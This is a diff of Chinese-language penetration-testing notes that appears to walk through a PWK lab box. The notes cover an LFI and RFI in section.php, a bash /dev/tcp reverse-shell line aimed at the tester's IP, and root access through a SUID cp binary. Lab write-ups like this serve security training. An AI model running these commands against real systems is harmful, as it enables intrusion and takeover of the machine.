@@ -8,17 +8,19 @@ gobuster dir -u http://10.11.1.35/cgi-bin/  -w /usr/share/dirb/wordlists/vulns/c
 
 1.nmap掃描發現80端口,直接網頁登入,F12發現請求section.php?後面待參數,嘗試/etc/passwd發現有LFI漏洞
 view-source:http://10.11.1.35/section.php?page=../../..//etc/httpd/conf/httpd.conf
+2.網路上找到RFI的reverse.php,取名成exploit.php(一般正常reverse.php無法啟動,會報錯fatal)
+http://10.11.1.35/section.php?page=http://192.168.119.134:4444/exploit.php
+3.在exploit.php網頁上執行取得reverse
+bash -i >& /dev/tcp/192.168.119.134/80 0>&1
+4.上傳LinEnum.sh執行發現SUID檔案cp,透過新增passwd用戶取得root權限
 
 
-~/.bin/
-~/audio/
-~/dev/
-~/docs/
-~/documents/
-~/downloads/
-~/games/
-~/mail/
-~/pics/
-~/share/
-~/tmp/
-~/vm/
+
+
+[-] Kernel information:
+Linux pain.offsecpwk 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+[-] Kernel information (continued):
+Linux version 3.10.0-957.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Thu Nov 8 23:39:32 UTC 2018
+
+
+
